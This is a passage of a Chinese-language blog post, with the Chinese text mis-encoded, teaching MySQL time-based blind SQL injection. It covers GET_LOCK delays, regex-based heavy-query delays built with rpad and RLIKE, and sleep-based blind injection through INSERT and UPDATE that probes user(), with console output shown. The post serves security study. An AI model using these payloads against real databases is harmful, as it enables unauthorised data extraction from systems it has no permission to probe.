  <p>You must also be aware that <strong>the injected query will most likely be executed only once</strong>. The database optimizer will execute it, store its result and use the returned value(s) when testing the WHERE clause against each record. As you can guess, this is must faster than executing the query each time. It should be mentioned however that the query will not be executed if the optimizer detects that the WHERE clause is always false. To avoid any unexpected results <strong>you should always try to generate a WHERE clause that will be verified for at least one record</strong>.</p>
</blockquote>

<p>ä½ è¿˜åº”è¯¥çŸ¥é“çš„æ˜¯ï¼Œå¤§å¤šæ•°æ³¨å…¥è¯­å¥åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæ•°æ®åº“ä¼˜åŒ–å™¨ä¼šæ‰§è¡Œä»–ï¼Œå°†ä»–çš„ç»“æœå­˜å‚¨èµ·æ¥ï¼Œå½“æµ‹è¯•WHEREè¯­å¥æ—¶ï¼Œå°†ç»“æœå–å‡ºï¼Œä½ å¯ä»¥æƒ³è±¡åˆ°ï¼Œè¿™è‚¯å®šæ¯”å¿…é¡»æ¯æ¬¡æ‰§è¡Œè¯­å¥è¦å¿«ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¼˜åŒ–å™¨æ£€æµ‹åˆ°WHEREè¯­å¥æ€»æ˜¯é”™è¯¯ï¼Œå°±ä¸ä¼šæ‰§è¡Œï¼Œä¸ºäº†é¿å…ä¸€äº›æƒ³ä¸åˆ°çš„ç»“æœï¼Œå½“ä½ ç¡®è®¤éœ€è¦è¿”å›ç»“æœæ—¶ï¼Œä½ åº”è¯¥å…ˆå°è¯•ç”ŸæˆWHEREè¯­å¥ã€‚</p>

<h1 id="get_lock">GET_LOCK</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET_LOCK(str, timeout)
</code></pre></div></div>

<p>å¯¹å…³é”®å­—è¿›è¡Œäº†get_lock,é‚£ä¹ˆå†å¼€å¦ä¸€ä¸ªsessionå†æ¬¡å¯¹å…³é”®è¿›è¡Œget_lockï¼Œå°±ä¼šå»¶æ—¶æˆ‘ä»¬æŒ‡å®šçš„æ—¶é—´</p>

<p><strong>SESSION A</strong>ä¸Šé”ï¼Œæ³¨å…¥æ—¶çš„ç¬¬ä¸€æ­¥ä¹Ÿæ˜¯å¯¹å­—æ®µåŠ é”</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select get_lock('111',10);
+--------------------+
| get_lock('111',10) |
+--------------------+
|                  1 |
+--------------------+
1 row in set (0.01 sec)
</code></pre></div></div>

<p>å†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯<strong>SESSION B</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select get_lock('111',5);
+-------------------+
| get_lock('111',5) |
+-------------------+
|                 0 |
+-------------------+
1 row in set (5.00 sec)
</code></pre></div></div>

<p>å¯ç»“åˆ<strong>andçŸ­è·¯è¿ç®—è§„åˆ™</strong>è¿›è¡Œæ—¶é—´ç›²æ³¨</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from vorname where Vorname='Lina' and 1=1 and  get_lock('111',2);
Empty set (2.00 sec)
</code></pre></div></div>

<p><strong>é™åˆ¶æ¡ä»¶</strong></p>

<p>æ•°æ®åº“è¿æ¥å¿…é¡»æ˜¯æŒä¹…è¿æ¥ï¼Œè¿™ä¸ªæˆ‘è¿˜æ²¡æœ‰å®è·µè¿‡ï¼Œå‚è€ƒå‚è€ƒæ–‡ç« ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯åœ¨æ•°æ®åº“<strong>mysql_connect()</strong>åˆ°<strong>mysql_close()</strong>ä¹‹é—´çš„ç”Ÿå‘½å‘¨æœŸæ‰ç”Ÿæ•ˆã€‚</p>

<h1 id="æ­£åˆ™è¡¨è¾¾å¼">æ­£åˆ™è¡¨è¾¾å¼</h1>

<p>åŸç†æ˜¯é€šè¿‡å¤§é‡çš„æ­£åˆ™åŒ¹é…å®ç°å»¶æ—¶ï¼Œä¸<strong>benchmark</strong>å’Œå‰é¢è¯´çš„<strong>heavy query</strong>æœ¬è´¨ç›¸ä¼¼ã€‚</p>

<p>MySQLä¸­æœ‰<strong>like</strong>ã€<strong>rlike</strong>ã€<strong>regexp</strong>æ­£åˆ™å¯ä»¥ç”¨æ¥åŒ¹é…ï¼Œå…¶ä¸­<strong>like</strong>å†…å®¹æ˜¯é€šé…ç¬¦ï¼Œä¸æ˜¯æ­£åˆ™ï¼›<strong>rlike</strong>å’Œ<strong>regexp</strong>å†…å®¹å¯ä»¥æ­£åˆ™ã€‚</p>

<p><strong>like</strong></p>

<p>likeå¸¸ç”¨çš„é€šé…ç¬¦ï¼š%ã€_ã€escape</p>

<table>
  <thead>
    <tr>
      <th>é€šé…ç¬¦</th>
      <th>ç”¨æ³•</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>%</td>
      <td>åŒ¹é…0ä¸ªæˆ–ä»»æ„å¤šä¸ªå­—ç¬¦</td>
    </tr>
    <tr>
      <td>_</td>
      <td>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦</td>
    </tr>
    <tr>
      <td>escape</td>
      <td>è½¬ä¹‰å­—ç¬¦ï¼Œå¯åŒ¹é…%å’Œ_</td>
    </tr>
  </tbody>
</table>

<p>ä¸¾ä¾‹</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from vorname where Vorname like 'L%';
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
+---------+-----------+-----+
2 rows in set (0.00 sec)

mysql&gt; select * from vorname where Vorname like '%L__a%';
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
+---------+-----------+-----+
2 rows in set (0.00 sec)

mysql&gt; select * from vorname where Vorname not like '%L_r%';
+---------+------------+-----+
| Vorname | Nachname   | Alt |
+---------+------------+-----+
| Lina    | Schneider  |  22 |
| Patric  | Wang       |  23 |
| Tobias  | Alexandria |  22 |
+---------+------------+-----+
3 rows in set (0.01 sec)
</code></pre></div></div>

<p>escape â€˜/â€™ æ˜¯æŒ‡ç”¨â€™/â€™è¯´æ˜åœ¨/åé¢çš„å­—ç¬¦ä¸æ˜¯é€šé…ç¬¦ï¼Œè€Œæ˜¯æ™®é€šç¬¦</p>

<p><strong>rlike</strong>ã€<strong>regexp</strong></p>

<p>è¿”å›å€¼ä¸º<strong>1</strong>æˆ–<strong>0</strong>ï¼Œå¸¸ç”¨çš„é€šé…ç¬¦.ã€*ã€[]ã€^ã€$ã€{n}</p>

<table>
  <thead>
    <tr>
      <th>é€šé…ç¬¦</th>
      <th>ç”¨æ³•</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>.</td>
      <td>åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td>
    </tr>
    <tr>
      <td>*</td>
      <td>åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå¾—åˆ°çš„å­—ç¬¦</td>
    </tr>
    <tr>
      <td>[]</td>
      <td>åŒ¹é…ä»»æ„ä¸€ä¸ª[]å†…çš„å­—ç¬¦ï¼Œ[ab]*å¯åŒ¹é…ç©ºã€aã€bã€æˆ–ä»»æ„ç”±aå’Œbç»„æˆçš„å­—ç¬¦ä¸²</td>
    </tr>
    <tr>
      <td>^</td>
      <td>åŒ¹é…å¼€å¤´ï¼Œå¦‚^såŒ¹é…ä»¥sæˆ–è€…Så¼€å¤´çš„å­—ç¬¦ä¸²</td>
    </tr>
    <tr>
      <td>$</td>
      <td>åŒ¹é…ç»“å°¾ï¼Œå¦‚s$åŒ¹é…ä»¥sç»“å°¾çš„å­—ç¬¦ä¸²</td>
    </tr>
    <tr>
      <td>{n}</td>
      <td>åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦åå¤næ¬¡</td>
    </tr>
  </tbody>
</table>

<p>ä¸¾ä¾‹</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select "1111111121111122222221234" rlike ".*2.*";
+-------------------------------------------+
| "1111111121111122222221234" rlike ".*2.*" |
+-------------------------------------------+
|                                         1 |
+-------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select "1111111121111122222221234" regexp ".*12.*";
+--------------------------------------------+
| "1111111121111122222221234" regexp ".*12.*" |
+--------------------------------------------+
|                                          1 |
+--------------------------------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong>æ„é€ å»¶æ—¶æ³¨å…¥</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from vorname where Vorname='Lina' and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)

mysql&gt; select * from vorname where Vorname='Lina' and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (6.20 sec)
</code></pre></div></div>

<p>ğŸ˜‡<strong>IF(0,x,y)</strong>æ—¶ï¼Œæ‰§è¡Œ<strong>y</strong>ï¼Œ<strong>IF(1,x,y)</strong>æ—¶ï¼Œæ‰§è¡Œ<strong>x</strong></p>

<p>ğŸ˜‡<strong>rpad(1,999999,â€™aâ€™)</strong>çš„æ„æ€æ˜¯åœ¨1åé¢è¡¥aï¼Œä½¿å¾—ä¸€å…±999999ä½</p>

<p>ğŸ˜‡ç„¶åé€šè¿‡<strong>rlike</strong>åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯ä¸æ˜¯å½¢å¦‚<strong>aaaaaab</strong>ï¼Œè‚¯å®šæ²¡æœ‰åé¢è¿™ä¸ª<strong>b</strong>å•¦ï¼Œè¿”å›å€¼0</p>

<h1 id="insert-å’Œ-update-çš„ç›²æ³¨">insert å’Œ update çš„ç›²æ³¨</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insert into vorname values (16,'sueisok','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));

update vorname set Alt = 21|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where Nachname='sueisok';
</code></pre></div></div>

<p>ä½†è¿™ä¸ªä¼šå½±å“æ•°æ®åº“æ•°æ®</p>

<h1 id="refer">Refer</h1>

<p><a href="shenmedoumeiyou">https://xz.aliyun.com/t/5505</a></p>

<p><a href="dianjibunengtiaozhuan">https://www.k0rz3n.com/2019/02/21/ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£ SQL ç›²æ³¨/</a></p>

<p><a href="dianji">https://blog.csdn.net/ouyn8/article/details/44674563</a></p>

<p><a href="hahaha">https://blog.csdn.net/yuanjiu4221/article/details/82661424</a></p>

  <!-- Introducing the share module -->
  
  <div class="social-share-wrapper">
    <div class="social-share"></div>
  </div>


<!-- share.js -->
<script src="/assets/js/social-share.min.js"></script>
<script>
  socialShare('.social-share', {
    sites: [
      
        'weibo'
        ,
        
      
        'qq'
        ,
        
      
        'wechat'
        
      
    ],
    wechatQrcodeTitle: "Share to WeChat circle",
    wechatQrcodeHelper: 'I look forward to seeing this article in the circle of friends.'
  });
</script>

</div>

<!-- Bottom anchor -->
<a id="htmldown" name="htmldown"></a>
<!-- Introducing the comment module -->



    <section class="post-footer-item comment">
      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODI3Ny8yNDc3MQ=="></div>
    </section>

    <!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->
    <script type="text/javascript">
       (function(d, s) {
           var j, e = d.getElementsByTagName(s)[0];

           if (typeof LivereTower === 'function') { return; }

           j = d.createElement(s);
           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
           j.async = true;

           e.parentNode.insertBefore(j, e);
       })(document, 'script');
    </script>
    <noscript>Please activate JavaScript for normal use.</noscript>
    <!-- City version code installation has been completed -->





<!-- Introducing the goto module -->
<div class="bounceInRight animated go">
  <a title="Top switch page" class="gototop" href="#htmlup" target="_self">
    <div class="box" style="font-family:'ffad_matroregular';">
        Top
    </div>
  </a>
  <a title="At the bottomlivereè¯„è®ºå“¦" class="gotobottom" href="#htmldown" target="_self">
    <div class="box" style="font-family:'ffad_matroregular';">
        Foot
    </div>
  </a>
</div>

<!-- Introduce the module at the bottom of the page -->

<footer id="bottom">
  <script src="/assets/css/bootstrap.min.css"></script>

<!-- START BREADCRUMBS -->
<nav aria-label="breadcrumb">

  <ol class="breadcrumb">
  
  
  
  </ol>
</nav>

<!-- END BREADCRUMBS -->


<div id="breadcrumbs">

<a href="/">Home</a>

  
    / <a href="/blog/">Blog</a>
  

  
    / Sqli time based
  

</div>
<style>
#breadcrumbs {margin-left: 0

      font-size: 10rem;
      padding: 0.75rem 1rem;
      margin-bottom: 1rem;
      list-style: none;
      background-color: # #fcfcfc;
      border-radius: 0.25rem;

      content: "";
      display: table;
      clear: both;

      float: left;

      display: inline-block;
      padding-right: 0.5rem;
      padding-left: 0.5rem;
      color: #818a91;
      content: "/";

      text-decoration: underline;

      text-decoration: none;

}
</style>

  <br>
  <span>sueisok Â©
  
  
  2020
  <br>
  Powered by <a href="https://www.jekyll.com/">Jekyll</a> | <a href="https://github.com/JonyBepary/HardCandy-Jekyll-Mod">HardCandy-Jekyll Mod</a></span>
</footer>
<link rel="stylesheet" href="/assets/css/style.css">
<link rel="stylesheet" href="/assets/css/media.css">
<link rel="stylesheet" href="/assets/css/animate.min.css">
<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
<link rel="stylesheet" href="/assets/css/github-markdown.css">
<!-- SNS-icon -->
<script src="/assets/js/font_856428_y9z6nq7zf5.js"></script>
<!-- share.css -->
<link rel="stylesheet" href="/assets/css/share.min.css">
<!-- font -->
<link rel="stylesheet" href="/assets/css/font.css">
<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->



<!-- Quote the animation effect of wow.js -->
<script src="/assets/js/wow.js"></script>
<script>
    var wow = new WOW({
        boxClass: 'wow',
        animateClass: 'animated',
        // offset: 600,
        mobile: true,
        live: true
    });
    wow.init();
</script>
<!-- Page refreshes back to top -->
<script>
    window.onbeforeunload = function(){
        //The page automatically returns to the top after refreshing
        document.documentElement.scrollTop = 0;  //ieä¸‹
        document.body.scrollTop = 0;  //éie
    }
</script>

<!-- preloder script -->
<!-- end -->
<script>
//open external links in a new window
function external_new_window() {
    for(var c = document.getElementsByTagName("a"), a = 0;a < c.length;a++) {
    var b = c[a];
    b.getAttribute("href") && b.hostname !== location.hostname
    }
}
//open PDF links in a new window
function pdf_new_window ()
{
    if (!document.getElementsByTagName) return false;
    var links = document.getElementsByTagName("a");
    for (var eleLink=0; eleLink < links.length; eleLink ++) {
    if ((links[eleLink].href.indexOf('.pdf') !== -1)||(links[eleLink].href.indexOf('.doc') !== -1)||(links[eleLink].href.indexOf('.docx') !== -1)) {
        links[eleLink].onclick =
        function() {
            window.open(this.href);
            return false;
        }
    }
    }
}
pdf_new_window()
external_new_window();
</script>

<style>
.videoWrapper {
    position: relative;
    padding-bottom: 56.333%;
    height: 0;
    background: black;
}
.videoWrapper iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: 0;
}
</style>

<script>
function get_youtube_id(url) {
    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
    return (url.match(p)) ? RegExp.$1 : false;
}
function vimeo_embed(url,el) {
    var id = false;
    $.ajax({
      url: 'https://vimeo.com/api/oembed.json?url='+url,
      async: true,
      success: function(response) {
        if(response.video_id) {
          id = response.video_id;
          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
          if(autoplay==1) theInnerHTML += '&autoplay=1';
          if(loop==1) theInnerHTML += '&loop=1';
          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>';
          el.innerHTML = theInnerHTML;
        }
      }
    });
}
function video_embed() {
    var p = document.getElementsByTagName('p');
    for(var i = 0; i < p.length; i++) {
        //check if this is an external url (that starts with https:// or http://
        if (p[i].innerHTML.indexOf("http://") == 0 ||
            p[i].innerHTML.indexOf("https://") == 0) {
            var youtube_id = get_youtube_id(p[i].innerHTML);
            if(youtube_id) {
                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
                if(autoplay==1) theInnerHTML += '&autoplay=1';
                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
                p[i].innerHTML = theInnerHTML;
            }
            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
                //ask vimeo for the id and place the embed
                vimeo_embed(p[i].innerHTML,p[i]);
            }
        }
    }
}
video_embed();

function mp3_embed() {
    var p = document.getElementsByTagName('p');
    for(var i = 0; i < p.length; i++) {
        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
            var str = p[i].innerHTML.split('?');
            if(str.length == 1) str[1] = '';
            var str1 = str[1];
            str1 = str1.replace('&','').replace('&','');
            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
            str1 = str1.replace('loop=1','').replace('loop=0','');
            str1 = str1.replace('controls=0','').replace('controls=1','');

            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
                var newInnerHTML = '<audio';
                if(autoplay==1) newInnerHTML += ' autoplay';
                if(loop==1) newInnerHTML += ' loop';
                if(controls==1) newInnerHTML += ' controls';
                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
                p[i].innerHTML = newInnerHTML;
            }
        }
    }
}
mp3_embed();
</script>


<!-- preloder script -->
<script>
    var preloader = document.getElementById("loader");
    function loaderFunc(){
      preloader.style.display = 'none';
    };
</script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<!-- end -->

</body>
</html>
